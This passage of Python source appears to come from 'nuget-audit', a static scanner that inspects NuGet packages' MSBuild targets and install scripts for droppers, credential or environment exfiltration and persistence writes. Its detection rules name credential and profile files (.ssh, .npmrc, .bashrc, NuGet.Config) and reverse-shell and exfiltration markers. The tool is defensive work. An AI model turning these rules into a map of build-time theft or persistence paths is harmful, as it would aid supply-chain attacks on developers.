            s = re.sub(r"\$\(\s*(\w+)\s*\)", lambda m: self.props.get(m.group(1).lower(), m.group(0)), s)
        return s

    def hooked(self, extra_hooked=frozenset()):
        """Targets that run without anyone asking for them by name."""
        hooked = set(self.initial)
        for prop, tl in self.dependson_props.items():
            hooked.update(tl)
        for nm, el in self.targets.items():
            for attr in ("BeforeTargets", "AfterTargets"):
                tl = _split_targets(el.get(attr))
                refs = _refs_in(el.get(attr))
                if any(t in STD_TARGETS or t in extra_hooked or t not in self.targets for t in tl) or refs:
                    hooked.add(nm)
        # propagate through DependsOnTargets / CallTarget / MSBuild Targets= from hooked targets
        changed = True
        while changed:
            changed = False
            for nm in list(hooked):
                el = self.targets.get(nm)
                if el is None:
                    continue
                deps = _split_targets(self.expand(el.get("DependsOnTargets") or ""))
                for sub in el.iter():
                    if _local(sub.tag) in ("CallTarget", "MSBuild"):
                        deps += _split_targets(self.expand(sub.get("Targets") or ""))
                for d in deps:
                    if d in self.targets and d not in hooked:
                        hooked.add(d)
                        changed = True
        return hooked


def _cond_chain(el, parents):
    conds = []
    cur = el
    while cur is not None:
        c = cur.get("Condition")
        if c:
            conds.append(c)
        cur = parents.get(cur)
    return " && ".join(conds)


OPTIN_COND = re.compile(r"'\$\((\w+)\)'\s*==\s*'(?:true|enable|enabled|on|1)'|^\s*'?\$\((\w+)\)'?\s*$", re.I)
OFF_VALUES = ("", "false", "0", "off", "disable", "disabled", "no")


def _xml_escape(s):
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")


def _find_line(text, needle, lines, start=0):
    """Line of needle (an attribute value as ElementTree returns it, i.e. unescaped)."""
    if not needle:
        return 0, start
    for cand in (needle[:120], _xml_escape(needle)[:120], needle[:40], _xml_escape(needle)[:40],
                 re.split(r"[\"&<>']", needle)[0][:40]):
        if len(cand) < 4:
            continue
        i = text.find(cand, start)
        if i < 0:
            i = text.find(cand)
        if i >= 0:
            return lines.line(i), i
    return 0, start


def scan_msbuild(text, path, ctx_kind, findings, info, seen, hooked_extra=frozenset(), pkg_files=None,
                 pkg_props=None):
    """ctx_kind: 'build' (auto-imported dir) or 'aux'. Returns {referenced script: ctx}."""
    mf = MSBuildFile(text, path)
    for k, v in (pkg_props or {}).items():
        mf.props.setdefault(k, v)
    lines = _Lines(text)
    local = []
    referenced = {}
    if not mf.ok:
        # Not well-formed XML (MSBuild would reject it too, unless it's a template): regex fallback
        for m in re.finditer(r"<Exec\b[^>]{0,2000}?Command\s*=\s*\"([^\"]{1,4000})\"", text, re.I | re.S):
            _scan_fragment(m.group(1), path, lines.line(m.start()), "build-optin" if ctx_kind == "build" else "aux",
                           local, seen)
        _post(local, path, findings, info)
        return referenced
    hooked = mf.hooked(hooked_extra)
    parents = {c: p for p in mf.root.iter() for c in p}

    def target_of(el):
        cur = parents.get(el)
        while cur is not None and _local(cur.tag) != "Target":
            cur = parents.get(cur)
        return cur

    def ctx_for(el):
        if ctx_kind != "build":
            return "aux"
        t = target_of(el)
        if t is None:
            return "build-eval"
        nm = (t.get("Name") or "").lower()
        cond = _cond_chain(el, parents)
        # opt-in: the code only runs when the consumer sets a property to true; we can't see a
        # default for it in this file
        for part in cond.split(" && "):
            m = OPTIN_COND.search(part)
            if m and not CI_RE.search(part):
                name = (m.group(1) or m.group(2)).lower()
                default = mf.props.get(name)
                if default is None or default.strip().strip("'").lower() in OFF_VALUES:
                    return "build-optin"
        return "build-auto" if nm in hooked else "build-optin"

    pos = 0
    code_buf = []
    dl_dests = []
    run_dl = []
    for el in mf.root.iter():
        tag = _local(el.tag)
        frag, kind = None, None
        if tag == "Exec":
            frag = el.get("Command") or ""
            kind = "exec"
        elif tag == "DownloadFile":
            frag = "<DownloadFile SourceUrl=\"%s\" DestinationFolder=\"%s\" />" % (
                el.get("SourceUrl") or "", el.get("DestinationFolder") or "")
            kind = "download"
        elif tag in ("WriteLinesToFile", "Copy", "Move", "Touch", "MakeDir"):
            dest = " ".join(filter(None, [el.get("File"), el.get("DestinationFolder"), el.get("DestinationFiles"),
                                          el.get("Directories"), el.get("Files")]))
            frag = "%s -> %s" % (tag, dest)
            kind = "write"
        elif tag == "UsingTask":
            tf = (el.get("TaskFactory") or "")
            body = "".join(el.itertext())
            if "CodeTaskFactory" in tf or "RoslynCodeTaskFactory" in tf or "PowerShell" in tf:
                frag = body
                kind = "inline"
                local.append(_item("INFO", "inline_task", "Inline MSBuild Task",
                                   "Declares an inline C#/VB/PowerShell task (%s)" % tf, path,
                                   _find_line(text, el.get("TaskName") or "UsingTask", lines)[0], el.get("TaskName") or "", ""))
                local[-1]["ctx"] = "build-auto" if ctx_kind == "build" else "aux"
            elif el.get("AssemblyFile"):
                af = mf.expand(el.get("AssemblyFile"))
                if ("compiled_task", path, af) in seen:
                    continue
                seen.add(("compiled_task", path, af))
                local.append(_item("INFO", "compiled_task", "Compiled MSBuild Task",
                                   "Loads a task assembly (binary; not inspectable statically)", path,
                                   _find_line(text, el.get("AssemblyFile"), lines)[0], af, ""))
                if re.search(r"\$\((?:Temp|TMP|LocalAppData|AppData|UserProfile|HOME)\)|GetTempPath|%TEMP%", af, re.I):
                    frag = "UsingTask AssemblyFile=%s" % af
                    kind = "taskload"
        if frag is None:
            continue
        n, pos = _find_line(text, frag if kind in ("exec", "inline") else (el.get("SourceUrl") or el.get("File") or
                                                                             el.get("DestinationFolder") or tag), lines)
        ctx = ctx_for(el)
        expanded = mf.expand(frag)
        cond = _cond_chain(el, parents)
        ci_gated = bool(CI_RE.search(cond)) and ctx != "aux"
        code = expanded if expanded == frag else frag + "\n" + expanded
        if ctx != "aux":
            code_buf.append(code)
        if kind == "download":
            d = mf.expand(el.get("DestinationFolder") or el.get("DestinationFileName") or "").strip()
            fn = posixpath.basename((el.get("DestinationFileName") or mf.expand(el.get("SourceUrl") or "")).split("?")[0])
            dl_dests.append((d, fn, ctx, ci_gated, n))
        if kind == "exec":
            if ("msbuild_exec", path, ctx) not in seen:
                seen.add(("msbuild_exec", path, ctx))
                local.append(_item("INFO", "msbuild_exec", "MSBuild Exec",
                                   "Runs a command from an MSBuild target (%s)" % ctx, path, n, frag, frag))
                local[-1]["ctx"] = ctx
            for d, fn, dctx, dci, dn in dl_dests:
                if (fn and fn in expanded) or (d and len(d) > 4 and d in expanded and CHMOD_RE.search(expanded)):
                    run_dl.append((ctx, ci_gated or dci, n))
        if kind == "write":
            # only destinations matter; writes into obj/bin/project dir are the job
            _scan_fragment(code, path, n, ctx, local, seen, ci_gated)
            if re.search(r"\$\((?:UserProfile|HOME|AppData|LocalAppData|ProgramData|windir|SystemRoot)\)|"
                         r"GetFolderPath|%USERPROFILE%|%APPDATA%|~/", expanded, re.I) and \
                    re.search(r"NuGet\.Config|\.ssh|\.bashrc|\.zshrc|Startup|ImportBefore|ImportAfter|\.profile|"
                              r"\.gitconfig|\.npmrc", expanded, re.I):
                local.append(_item("HIGH", "persistence_write", "Persistence / Out-of-Tree Write",
                                   "MSBuild task writes into the user profile (%s)" % tag, path, n, expanded, expanded))
                local[-1]["ctx"] = ctx
            continue
        if kind == "inline":
            code = _decomment(code, "x.cs")
        if kind == "download":
            local.append(_item("INFO", "network", "Network Access", "MSBuild DownloadFile task", path, n,
                               el.get("SourceUrl") or "", frag))
            local[-1]["ctx"] = ctx
        _scan_fragment(code, path, n, ctx, local, seen, ci_gated)
        if kind == "taskload":
            local.append(_item("HIGH", "temp_task_assembly", "Task Assembly Loaded from Temp/Profile",
                               "Loads an MSBuild task DLL from a temp or profile path (not shipped in the package)",
                               path, n, frag, frag))
            local[-1]["ctx"] = ctx
        # scripts the command runs
        if kind == "exec" and pkg_files:
            for ref in (SCRIPT_REF_RE.findall(expanded) if SCRIPT_EXT_RE.search(expanded) else []):
                for pf in pkg_files:
                    if posixpath.basename(pf).lower() == ref.lower():
                        prev = referenced.get(pf)
                        if prev is None or (prev == "build-optin" and ctx == "build-auto"):
                            referenced[pf] = ctx
    # property functions evaluated at load time (outside targets)
    for m in re.finditer(r"\$\(\[System\.(?:IO\.File|Environment|IO\.Directory)\]::\w+\([^\n]{0,300}?\)\s*\)",
                         _strip_comments(text, XML_COMMENT)):
        el_ctx = "build-eval" if ctx_kind == "build" else "aux"
        _scan_fragment(m.group(0), path, lines.line(m.start()), el_ctx, local, seen)
    # raw text (outside code): only collector hosts, reverse shells and encoded payloads count
    raw = _strip_comments(text, XML_COMMENT)
    raw_ids = _active_ids(raw.lower())
    for sev, pg, rx in _COMPILED:
        if pg["id"] not in ("exfil_host", "reverse_shell", "encoded_exec", "worm_propagation"):
            continue
        if pg["id"] not in raw_ids:
            continue
        for mm in rx.finditer(raw):
            n = lines.line(mm.start())
            if (pg["id"], path, n) in seen:
                continue
            seen.add((pg["id"], path, n))
            f = _item(sev.upper(), pg["id"], pg["name"], pg["desc"] + " [in MSBuild text]", path, n, mm.group(0),
                      raw[max(0, mm.start() - 80):mm.end() + 80].replace("\n", " "))
            f["ctx"] = "aux"
            local.append(f)
            break
    if run_dl:
        c, ci, n = max(run_dl, key=lambda x: (x[0] == "build-auto", x[1]))
        verified = bool(CHECKSUM_RE.search("\n".join(code_buf)))
        sev = "MEDIUM" if verified else "CRITICAL" if (ci or c in ESCALATE) else "HIGH"
        f = _item(sev, "dropper", "Download & Run (dropper)",
                  "Downloads a file at build time and then executes it" +
                  (" - gated on a CI variable" if ci else "") + (" (hash verified)" if verified else ""),
                  path, n, "", "DownloadFile -> Exec")
        f["ctx"] = "aux" if c == "aux" else c
        f["final"] = True
        local.append(f)
    _post(local, path, findings, info, file_text="\n".join(code_buf))
    return referenced


def _post(local, path, findings, info, file_text=None):
    """File-level combination rules + context-based severity."""
    ids = {f["id"] for f in local}
    scored_ctx = [f for f in local if f.get("ctx") in SCORED_CTX]
    sids = {f["id"] for f in scored_ctx}
    has_net = "network" in sids or "exfil_host" in sids
    ctxs = {f.get("ctx") for f in scored_ctx}
    top_ctx = "build-auto" if "build-auto" in ctxs else "install" if "install" in ctxs else \
        "build-eval" if "build-eval" in ctxs else "build-optin" if "build-optin" in ctxs else \
        "uninstall" if "uninstall" in ctxs else "aux"
    ci = any(f.get("ci_gated") for f in scored_ctx)
    extra = []
    if "credential_read" in sids and has_net:
        extra.append(_item("CRITICAL", "credential_exfil", "Credential Exfiltration",
                           "Reads a credential store and sends over the network in the same file", path, 0, "",
                           "file-level combination"))
    if "env_dump" in sids and has_net:
        extra.append(_item("CRITICAL", "env_exfil", "Environment Exfiltration",
                           "Serialises the whole environment and sends over the network in the same file", path, 0, "",
                           "file-level combination"))
    src = file_text if file_text is not None else ""
    srcl = src.lower() if src else ""
    dl = any(f["id"] == "network" and DL_TO_FILE_RE.search(f["context"] + f["matched"]) for f in scored_ctx) or \
        bool(src and any(x in srcl for x in DL_NEEDLES) and DL_TO_FILE_RE.search(src))
    if dl and scored_ctx and "dropper" not in ids and (src and (EXEC_TEMP_RE.search(src) or CHMOD_RE.search(src))):
        sev = "CRITICAL" if ci or top_ctx in ESCALATE else "HIGH"
        extra.append(_item(sev, "dropper", "Download & Run (dropper)",
                           "Downloads a file to disk, then makes it executable / runs it from a temp path"
                           + (" - gated on a CI variable" if ci else ""), path, 0, "", "file-level combination"))
    if extra:
        for e in extra:
            e["ctx"] = top_ctx
        local.extend(extra)
    for f in local:
        c = f.get("ctx", "aux")
        if f["severity"] == "INFO" or f.get("final"):
            continue
        if c == "aux":
            # nothing we can see executes this text: real payload markers stay, the rest is context
            if f["id"] in ("exfil_host", "reverse_shell", "encoded_exec", "worm_propagation", "credential_exfil",
                           "env_exfil"):
                f["severity"] = "MEDIUM"
                f["description"] += " [not executed by any build/install hook we can see]"
            else:
                f["severity"] = "INFO"
            continue
        if c == "uninstall" and f["id"] not in ("download_execute", "encoded_exec", "reverse_shell", "destructive",
                                                "credential_exfil", "env_exfil", "worm_propagation", "exfil_host"):
            f["severity"] = "INFO"
            continue
        if f["id"] in ("env_dump",) and not has_net:
            f["severity"] = "INFO"   # env listing with no network sink = diagnostics
            continue
        if f["id"] == "credential_read" and not has_net:
            f["severity"] = "MEDIUM"
        if f["id"] == "tls_bypass" and c == "build-optin":
            f["severity"] = "MEDIUM"
        if f.get("ci_gated") and f["severity"] in ("HIGH", "MEDIUM") and f["id"] not in ("raw_ip_url", "tls_bypass"):
            f["severity"] = "CRITICAL"
            f["description"] += " [gated on a CI variable]"
        elif c in ESCALATE and f["severity"] == "HIGH":
            f["severity"] = "CRITICAL"
            f["description"] += {"build-auto": " [runs on every build]", "build-eval": " [runs on project load]",
                                 "install": " [runs at package install]"}[c]
    # install.ps1 / init.ps1 talking to the network: rare in legitimate packages, and the 2023
    # typosquat route (Visual Studio runs init.ps1 on install and on every solution open)
    if top_ctx == "install" and has_net and not any(
            f["severity"] != "INFO" and f.get("ctx") == "install" for f in local):
        f = _item("MEDIUM", "install_network", "Install-Script Network Access",
                  "tools/install.ps1 / init.ps1 uses the network (Visual Studio runs it on install)",
                  path, 0, "", "file-level")
        f["ctx"] = "install"
        local.append(f)
    # network at build time without verification
    if top_ctx == "build-auto" and has_net and not any(
            f["id"] in ("dropper", "download_execute", "credential_exfil", "env_exfil") for f in local) and \
            not (src and CHECKSUM_RE.search(src)) and \
            any(f["id"] == "network" and f.get("ctx") == "build-auto" for f in local):
        local.append(_item("MEDIUM", "unverified_download", "Unverified Build-Time Download",
                           "A target hooked into the build uses the network with no hash verification in the file",
                           path, 0, "", "file-level"))
    for f in local:
        (info if f["severity"] == "INFO" else findings).append(f)


def scan_script(text, path, ctx, findings, info, seen):
    lines_txt = _decomment(text, path)
    local = []
    # nothing we can see runs an "aux" file: only payload markers can become findings there,
    # so only those signatures are run (keeps 30 MB of bundled node_modules / stdlib cheap)
    _scan_fragment(lines_txt, path, 1, ctx, local, seen, only_ids=AUX_IDS if ctx == "aux" else None)
    _post(local, path, findings, info, file_text=lines_txt)


# ---------------------------------------------------------------------------
# Package-level
# ---------------------------------------------------------------------------
def _nuspec_info(text):
    out = {}
    if not text:
        return out
    try:
        root = ET.fromstring(_strip_comments(text, XML_COMMENT).encode("utf-8", "replace"))
    except ET.ParseError:
        return out
    for el in root.iter():
        t = _local(el.tag)
        if t in ("id", "version", "authors", "developmentDependency") and t not in out:
            out[t] = (el.text or "").strip()
        if t == "packageType":
            out.setdefault("packageTypes", []).append(el.get("name"))
    return out


def classify(path):
    p = path.lower()
    if p.endswith(MSBUILD_EXT):
        return "build" if p.startswith(BUILD_DIRS) else "msbuild-aux"
    if p in INSTALL_SCRIPTS:
        return "uninstall" if p.endswith("uninstall.ps1") else "install"
    if p.endswith(SCRIPT_EXT):
        if p.startswith(("content/", "contentfiles/", "lib/", "ref/", "runtimes/")) and not p.endswith((".ps1", ".sh", ".cmd", ".bat")):
            return None   # source / JS that is copied into or loaded by the app at runtime, not at build
        return "script"
    return None


def scan_package(files, label="", binaries=()):
    """files: {relative_path: text}. binaries: names of binary members (for INFO counts)."""
    findings, info = [], []
    seen = set()
    nuspec = next((files[p] for p in files if p.lower().endswith(".nuspec") and "/" not in p), "")
    ni = _nuspec_info(nuspec)
    kinds = {p: classify(p) for p in files}
    pkg_files = [p for p, k in kinds.items() if k in ("script", "install", "uninstall")]
    # targets defined anywhere in the package that are hooked (cross-file BeforeTargets chains)
    hooked_global = set()
    pkg_props = {}
    builds = [p for p, k in kinds.items() if k == "build"]
    for p in builds:
        mf = MSBuildFile(files[p], p)
        if mf.ok:
            hooked_global |= mf.hooked()
            for k, v in mf.props.items():
                pkg_props.setdefault(k, v)
    referenced = {}
    total = 0
    order = sorted(files, key=lambda p: (kinds[p] not in ("build", "install"), p))
    for p in order:
        k = kinds[p]
        if k is None:
            continue
        t = files[p]
        total += len(t)
        if total > MAX_TOTAL:
            info.append(_item("INFO", "truncated", "Scan Truncated", "Package exceeds %d bytes of text" % MAX_TOTAL,
                              p, 0))
            break
        if k in ("build", "msbuild-aux"):
            refs = scan_msbuild(t, p, "build" if k == "build" else "aux", findings, info, seen,
                                frozenset(hooked_global), pkg_files, pkg_props)
            for rp, c in refs.items():
                prev = referenced.get(rp)
                if prev is None or c == "build-auto":
                    referenced[rp] = c
    for p in order:
        k = kinds[p]
        if k == "install":
            scan_script(files[p], p, "install", findings, info, seen)
        elif k == "uninstall":
            scan_script(files[p], p, "uninstall", findings, info, seen)
        elif k == "script":
            scan_script(files[p], p, referenced.get(p, "aux"), findings, info, seen)
    an = [b for b in binaries if b.lower().startswith("analyzers/") and b.lower().endswith(".dll")]
    bt = [b for b in binaries if b.lower().startswith(BUILD_DIRS + ("tasks/", "tools/")) and b.lower().endswith((".dll", ".exe"))]
    if an:
        info.append(_item("INFO", "analyzer_binary", "Roslyn Analyzer / Source Generator",
                          "%d analyzer DLL(s) - run inside the compiler and IDE; binaries are not inspected" % len(an),
                          an[0], 0))
    if bt:
        info.append(_item("INFO", "build_binary", "Build-Time Binary",
                          "%d DLL/EXE under build/ or tools/ (MSBuild tasks, bundled compilers)" % len(bt), bt[0], 0))
    r = _summarise(findings, info, label)
    r["package"] = ni
    r["build_time"] = {
        "build_files": sorted(builds),
        "install_scripts": sorted(p for p, k in kinds.items() if k in ("install", "uninstall")),
        "referenced_scripts": sorted(referenced),
        "auto_targets": sorted(t for t in hooked_global),
        "analyzers": len(an),
    }
    return r


def _summarise(findings, info, label):
    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    score = 0
    for f in findings:
        counts[f["severity"]] += 1
        score += SEVERITY_SCORE[f["severity"].lower()]
    level = next((s for s in ("CRITICAL", "HIGH", "MEDIUM", "LOW") if counts[s]), "SAFE")
    findings.sort(key=lambda f: (-SEV_ORDER[f["severity"]], f["file"], f["line"]))
    parts = ["%d %s" % (counts[s], s) for s in ("CRITICAL", "HIGH", "MEDIUM", "LOW") if counts[s]]
    return {"target": label, "risk_score": min(score, 100), "risk_level": level,
            "summary": ", ".join(parts) or "No issues found", "findings": findings, "info": info,
            "total_findings": len(findings), "info_count": len(info)}


def scan(content, label="<text>"):
    """Scan a bare string. MSBuild XML is treated as an auto-imported build file; anything else as an
    install script (the conservative cases)."""
    s = content.lstrip()
    if s.startswith("<") and ("<Project" in s or "<Target" in s or "<Exec" in s):
        if "<Project" not in s:
            content = "<Project><Target Name=\"X\" BeforeTargets=\"Build\">%s</Target></Project>" % content
        return scan_package({"build/x.targets": content}, label)
    return scan_package({"tools/install.ps1": content}, label)


# ---------------------------------------------------------------------------
# Loading targets (never restores, builds or executes package code)
# ---------------------------------------------------------------------------
UA = {"User-Agent": "nuget-audit/%s (+https://github.com/eltociear/nuget-audit)" % __version__}


def _get(url, headers=None, timeout=60, tries=4):
    h = dict(UA)
    h.update(headers or {})
    for i in range(tries):
        try:
            with urllib.request.urlopen(urllib.request.Request(url, headers=h), timeout=timeout) as r:
                return r.read(), r.headers
        except urllib.error.HTTPError as e:
            if e.code in (404, 403, 400, 416):
                raise
            if i == tries - 1:
                raise
        except Exception:
            if i == tries - 1:
                raise
        time.sleep(2 * (i + 1))


class RangeFile(io.RawIOBase):
    """Seekable read-only view of a remote file via HTTP Range requests (block-cached)."""
    BLOCK = 256 * 1024

    def __init__(self, url):
        self.url = url
        data, hdr = _get(url, {"Range": "bytes=0-0"})
        cr = hdr.get("Content-Range") or ""
        m = re.search(r"/(\d+)$", cr)
        if not m:
            raise IOError("server ignored Range")
        self.size = int(m.group(1))
        self.pos = 0
        self.cache = {}
        self.fetched = 0

    def readable(self):
        return True

    def seekable(self):
        return True

    def tell(self):
        return self.pos

    def seek(self, off, whence=0):
        self.pos = off if whence == 0 else self.pos + off if whence == 1 else self.size + off
        return self.pos

    def _block(self, b):
        if b not in self.cache:
            lo = b * self.BLOCK
            hi = min(self.size, lo + self.BLOCK) - 1
            data, _ = _get(self.url, {"Range": "bytes=%d-%d" % (lo, hi)}, timeout=120)
            self.cache[b] = data
            self.fetched += len(data)
            if len(self.cache) > 64:
                self.cache.pop(next(iter(self.cache)))
        return self.cache[b]

    def read(self, n=-1):
        if n is None or n < 0:
            n = self.size - self.pos
        n = max(0, min(n, self.size - self.pos))
        out = bytearray()
        while n > 0:
            b, o = divmod(self.pos, self.BLOCK)
            chunk = self._block(b)[o:o + n]
            if not chunk:
                break
            out += chunk
            self.pos += len(chunk)
            n -= len(chunk)
        return bytes(out)

    def readinto(self, buf):
        d = self.read(len(buf))
        buf[:len(d)] = d
        return len(d)


def _wanted(name):
    p = name.lower()
    if p.endswith(".nuspec") and "/" not in p:
        return True
    return classify(name) is not None


def files_from_zip(zf):
    out, bins = {}, []
    for zi in zf.infolist():
        name = urllib.parse.unquote(zi.filename.replace("\\", "/"))
        if name.endswith("/"):
            continue
        if name.lower().endswith(BINARY_EXT):
            bins.append(name)
            continue
        if not _wanted(name):
            continue
        if zi.file_size > MAX_FILE:
            out[name] = ""  # recorded, not scanned
            continue
        out[name] = zf.read(zi).decode("utf-8-sig", "replace")
    return out, bins


def files_from_dir(root):
    out, bins = {}, []
    for dp, dns, fns in os.walk(root):
        dns[:] = [d for d in dns if d not in (".git", "obj", "bin", "node_modules")]
        for fn in fns:
            p = os.path.join(dp, fn)
            rel = os.path.relpath(p, root).replace(os.sep, "/")
            if fn.lower().endswith(BINARY_EXT):
                bins.append(rel)
                continue
            if not _wanted(rel):
                continue
            try:
                if os.path.getsize(p) > MAX_FILE:
                    continue
                with open(p, encoding="utf-8-sig", errors="replace") as fh:
                    out[rel] = fh.read()
            except OSError:
                pass
    return out, bins


def split_spec(spec):
    name, _, ver = spec.partition("@")
    return name, (ver or "latest")


def resolve_version(pid, version="latest"):
    if version not in ("latest", "") and not re.search(r"[*\[\](),]", version):
        return version
    data, _ = _get("%s/%s/index.json" % (FLAT, pid.lower()))
    vs = json.loads(data)["versions"]
    stable = [v for v in vs if "-" not in v] or vs
    if version not in ("latest", ""):
        lo = re.sub(r"[\[\](),*]", " ", version).split()
        if lo:
            pref = lo[0].rstrip(".")
            c = [v for v in stable if v.startswith(pref)]
            if c:
                return c[-1]
    return stable[-1]


def fetch_package(pid, version="latest"):
    ver = resolve_version(pid, version).split("+")[0]   # build metadata is not part of the file name
    lp = pid.lower()
    url = "%s/%s/%s/%s.%s.nupkg" % (FLAT, lp, ver.lower(), lp, ver.lower())
    try:
        rf = RangeFile(url)
        zf = zipfile.ZipFile(io.BufferedReader(rf, buffer_size=65536))
    except (IOError, zipfile.BadZipFile):
        data, _ = _get(url, timeout=300)
        zf = zipfile.ZipFile(io.BytesIO(data))
    files, bins = files_from_zip(zf)
    return files, bins, ver


def audit_registry(spec):
    pid, ver = split_spec(spec)
    files, bins, ver = fetch_package(pid, ver)
    return scan_package(files, "%s@%s" % (pid, ver), bins)


def project_specs(path):
    """PackageReference items in a .csproj/.fsproj/.vbproj (+ Directory.Packages.props versions)."""
    text = open(path, encoding="utf-8-sig", errors="replace").read()
    central = {}
    d = os.path.dirname(os.path.abspath(path))
    while True:
        cp = os.path.join(d, "Directory.Packages.props")
        if os.path.exists(cp):
            for m in re.finditer(r"<PackageVersion\s+Include=\"([^\"]+)\"\s+Version=\"([^\"]+)\"",
                                 open(cp, encoding="utf-8-sig", errors="replace").read()):
                central[m.group(1).lower()] = m.group(2)
            break
        nd = os.path.dirname(d)
        if nd == d:
            break
        d = nd
    specs = []
    for m in re.finditer(r"<PackageReference\b([^>]*?)(/>|>(.*?)</PackageReference>)", text, re.S | re.I):
        attrs, body = m.group(1), m.group(3) or ""
        inc = re.search(r"\b(?:Include|Update)\s*=\s*\"([^\"]+)\"", attrs)
        if not inc:
            continue
        v = re.search(r"\bVersion(?:Override)?\s*=\s*\"([^\"]+)\"", attrs) or re.search(r"<Version>([^<]+)</Version>", body)
        ver = v.group(1) if v else central.get(inc.group(1).lower(), "latest")
        specs.append("%s@%s" % (inc.group(1), ver.strip("[] ")))
    return sorted(set(specs))


def lock_specs(path):
    d = json.load(open(path, encoding="utf-8-sig"))
    specs = set()
    for tfm, deps in (d.get("dependencies") or {}).items():
        for name, meta in (deps or {}).items():
            if (meta or {}).get("type") in ("Direct", "Transitive", "CentralTransitive") and meta.get("resolved"):
                specs.add("%s@%s" % (name, meta["resolved"]))
    return sorted(specs)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
_ICON = {"CRITICAL": "\U0001F534", "HIGH": "\U0001F7E0", "MEDIUM": "\U0001F7E1",
         "LOW": "\U0001F535", "SAFE": "\U0001F7E2"}


def _print(r, verbose):
    bt = r.get("build_time") or {}
    tag = []
    if bt.get("build_files"):
        tag.append("%d build file(s)" % len(bt["build_files"]))
    if bt.get("install_scripts"):
        tag.append("install.ps1")
    if bt.get("analyzers"):
        tag.append("%d analyzer(s)" % bt["analyzers"])
    print("%s %s  [%s]  score=%d  (%d findings, %d info)%s" % (
        _ICON.get(r["risk_level"], "?"), r["target"], r["risk_level"], r["risk_score"],
        r["total_findings"], r["info_count"], ("  runs-at-build: " + ", ".join(tag)) if tag else ""))
    for f in r["findings"]:
        print("    %-8s %s  %s:%s  (%s)" % (f["severity"], f["name"], f["file"], f["line"], f.get("ctx", "")))
        if f["context"] and f["line"]:
            print("             %s" % f["context"][:160])
    if verbose:
        for f in r["info"]:
            print("    info     %s  %s:%s  %s" % (f["name"], f["file"], f["line"], f["matched"][:80]))


def main(argv=None):
    args = list(sys.argv[1:] if argv is None else argv)
    if not args or args[0] in ("-h", "--help"):
        print(__doc__)
        return 0
    if args[0] == "--version":
        print(__version__)
        return 0
    as_json = "--json" in args
    verbose = "--verbose" in args or "-v" in args
    args = [a for a in args if a not in ("--json", "--verbose", "-v")]
    targets = []
    if args[0] == "--text":
        txt = " ".join(args[1:])
        targets.append(("<text>", lambda: scan(txt)))
    elif args[0] == "--project":
        for spec in project_specs(args[1]):
            targets.append((spec, (lambda s=spec: audit_registry(s))))
    elif args[0] == "--packages-lock":
        for spec in lock_specs(args[1]):
            targets.append((spec, (lambda s=spec: audit_registry(s))))
    else:
        for a in args:
            if os.path.isdir(a):
                def _d(p=a):
                    fs, bs = files_from_dir(p)
                    return scan_package(fs, p, bs)
                targets.append((a, _d))
            elif os.path.isfile(a):
                if a.lower().endswith(".nupkg"):
                    def _z(p=a):
                        fs, bs = files_from_zip(zipfile.ZipFile(p))
                        return scan_package(fs, p, bs)
                    targets.append((a, _z))
                elif a.lower().endswith((".csproj", ".fsproj", ".vbproj")):
                    for spec in project_specs(a):
                        targets.append((spec, (lambda s=spec: audit_registry(s))))
                elif os.path.basename(a).lower() == "packages.lock.json":
                    for spec in lock_specs(a):
                        targets.append((spec, (lambda s=spec: audit_registry(s))))
                else:
                    def _f(p=a):
                        t = open(p, encoding="utf-8-sig", errors="replace").read()
                        b = os.path.basename(p)
                        if b.lower().endswith(MSBUILD_EXT):
                            return scan_package({"build/" + b: t}, p)
                        if b.lower() in ("install.ps1", "init.ps1", "uninstall.ps1"):
                            return scan_package({"tools/" + b.lower(): t}, p)
                        return scan(t, p)
                    targets.append((a, _f))
            else:
                targets.append((a, (lambda s=a: audit_registry(s))))
    results, worst = [], "SAFE"
    for label, thunk in targets:
        try:
            r = thunk()
        except Exception as e:  # network errors, 404s, corrupt archives
            r = {"target": label, "risk_level": "SAFE", "risk_score": 0, "error": str(e)[:200],
                 "findings": [], "info": [], "total_findings": 0, "info_count": 0, "summary": "error"}
            if not as_json:
                print("\u26AA %s  [ERROR] %s" % (label, r["error"]))
        else:
            if not as_json:
                _print(r, verbose)
        results.append(r)
        if SEV_ORDER[r["risk_level"]] > SEV_ORDER[worst]:
            worst = r["risk_level"]
    if as_json:
        print(json.dumps(results if len(results) != 1 else results[0], indent=1))
    return 2 if SEV_ORDER[worst] >= SEV_ORDER["HIGH"] else 0


if __name__ == "__main__":
    sys.exit(main())
